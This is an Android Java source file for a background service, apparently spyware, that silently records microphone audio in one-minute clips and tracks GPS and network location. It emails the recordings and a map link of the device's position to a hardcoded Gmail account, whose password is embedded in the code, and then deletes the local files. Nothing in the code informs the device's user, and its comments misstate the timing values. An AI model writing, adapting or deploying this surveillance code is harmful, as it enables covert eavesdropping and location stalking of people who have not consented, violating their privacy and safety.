package tw.com.darkcorner.backgroundworker;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.os.Message;
import android.util.Log;
import android.os.HandlerThread;
import java.io.File;
import java.io.FileFilter;
import java.io.IOException;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Comparator;


public class ImplicitApp extends Service{
    private MediaRecorder mMediaRecorder;
    private ServiceHandler mServiceHandler;
    private String mFileDir = "/rec/";
    private String mFileName;
    private final String mFileExt = ".mp4";
    private File mExternalFileName;
    private Location mLastLocation=null;
    private LocationManager mLocationManager=null;
    JavaMailer mMailer = new JavaMailer("bigbite@gmail.com", "dores3arch");

    private final int mRecordeInterval = 60*1000; //10mins
    private final int mGpsInterval = 60*1000; //5mins
    private final int mRecordFileThreshold = 2; // send mail for each 5 recorded files

    private final class ServiceHandler extends Handler{
        public ServiceHandler(Looper looper) {
            super(looper);
        }

        // get current date string
        private String getCurrTime()
        {
            Calendar calendar = Calendar.getInstance();
            return String.format("%d-%d-%d %02d:%02d:%02d",
                calendar.get(Calendar.YEAR),calendar.get(Calendar.MONTH),calendar.get(Calendar.DAY_OF_MONTH), calendar.get(Calendar.HOUR_OF_DAY), calendar.get(Calendar.MINUTE), calendar.get(Calendar.SECOND));

        }

        public class ThreadMailer extends Thread{
            @Override
            public void run()
            {
                try {
                    // scan all lists
                    String path = Environment.getExternalStorageDirectory() + mFileDir;
                    File directory = new File(path);
                    File[] files = directory.listFiles(new FileFilter(){
                        @Override
                       public boolean accept(File fileName)
                       {
                           return fileName.getName().endsWith(".mp4");
                       }
                    });


                    Arrays.sort(files, new Comparator<File>() {
                        public int compare(File f1, File f2) {
                            return (int)(f2.lastModified() - f1.lastModified());
                        }
                    });
                    try {
                        mMailer = new JavaMailer("bigbite@gmail.com", "dores3arch");
                        // set mail subject
                        mMailer.setSubject(getCurrTime());

                        // add gps location
                        if (mLastLocation != null)
                            mMailer.setBody("http://maps.google.com/maps?q="+mLastLocation.getLatitude()+","+mLastLocation.getLongitude());
                        else
                            mMailer.setBody("Gps disabled.");
                        // if we reach file limit, attach files
                        for (int i=1; files.length > mRecordFileThreshold && files!= null && i<files.length; ++i)
                        {
                            Log.i(backgroundWorker.TAG, "Processing "+files[i].getAbsolutePath()+"...");
                            mMailer.addAttachment(files[i].getAbsolutePath());
                        }

                        mMailer.send();

                        // if we reach file limit, attach files
                        for (int i=1; files.length > mRecordFileThreshold && files!= null && i<files.length; ++i)
                        {
                            // delete the file
                            files[i].delete();
                        }
                    } catch (Exception e)
                    {
                        Log.i(backgroundWorker.TAG, "Error sending file.");
                        e.printStackTrace();
                    }



                } catch (Exception e)
                {
                    e.printStackTrace();
                }
            }
        }


        public class ThreadRecorder extends Thread{
            @Override
            public void run()
            {
                // sd card dir
                File sdCardRoot = Environment.getExternalStorageDirectory();

                // check directory
                File recordDir = new File(sdCardRoot+mFileDir);
                if (!recordDir.exists())
                {
                    Log.i(backgroundWorker.TAG, "Directory doesn't exist, creating...");
                    boolean success = false;
                    try {
                        recordDir.mkdir();
                        success = true;
                    } catch (Exception e)
                    {
                        Log.i(backgroundWorker.TAG, "Directory creating failed.");
                    }
                    // if unsuccess, set root dir as output dir
                    if (!success)
                        mFileDir = "";
                }

                // get  datetime as filename
                mFileName = sdCardRoot+mFileDir+getCurrTime()+mFileExt;

                
                // initializing filename and audio device
                mExternalFileName = new File(mFileName);
                mMediaRecorder = new MediaRecorder();
                mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mMediaRecorder.setOutputFile(mExternalFileName.getAbsolutePath());
                mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                try{
                    mMediaRecorder.prepare();
                    mMediaRecorder.start();
                    Log.i(backgroundWorker.TAG, "Recorder initialization successful.");
                } catch (IOException ioe)
                {
                    ioe.printStackTrace();
                    Log.i(backgroundWorker.TAG, "Recorder initialization failed.");
                }

            }
        }



        @Override
        public void handleMessage(Message msg) {
            Thread mMailerThread = null;
            for (;;) {
                ThreadRecorder threadRecorder = new ThreadRecorder();
                Log.i(backgroundWorker.TAG, "Thread started.");
                threadRecorder.start();
                try {
                    Thread.sleep(mRecordeInterval);
                } catch (InterruptedException ie) {

                }

                try {
                    mMediaRecorder.stop();
                    threadRecorder.join();
                    Log.i(backgroundWorker.TAG, "Thread stopped.");

                    // if mailer is not running, invoke mailer
                    if (mMailerThread == null || mMailerThread.isAlive() == false) {
                        mMailerThread = new ThreadMailer();
                        mMailerThread.start();
                    }

                } catch (Exception e) {
                    Log.i(backgroundWorker.TAG, "Thread is interrupted.");
                    e.printStackTrace();
                }

            }
        }
    }


    public class CustomLocationLisener implements LocationListener{

        @Override
        public void onLocationChanged(Location location)
        {
            mLastLocation = location;
            Log.i(backgroundWorker.TAG, location.getLatitude()+","+location.getLongitude());
        }

        @Override
        public void onProviderEnabled(String provider)
        {

        }
        @Override
        public void onProviderDisabled(String provider)
        {

        }
        @Override
        public void onStatusChanged(String provider, int status, Bundle extra)
        {

        }
    }

    @Override
    public android.os.IBinder onBind(Intent intent)
    {
        return null;
    }

    @Override
    @SuppressWarnings({"MissingPermission"})
    public void onCreate()
    {
        // start background thread
        HandlerThread thread = new HandlerThread("ServiceStart",Process.THREAD_PRIORITY_BACKGROUND);
        thread.start();
        mServiceHandler = new ServiceHandler(thread.getLooper());

        CustomLocationLisener customLocationLisener = new CustomLocationLisener();
        mLocationManager = (LocationManager)getSystemService(getBaseContext().LOCATION_SERVICE);
        mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, mGpsInterval, 10, customLocationLisener);
        mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, mGpsInterval, 10, customLocationLisener);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        Message msg = mServiceHandler.obtainMessage();
        mServiceHandler.sendMessage(msg);
        return START_NOT_STICKY;
    }
}
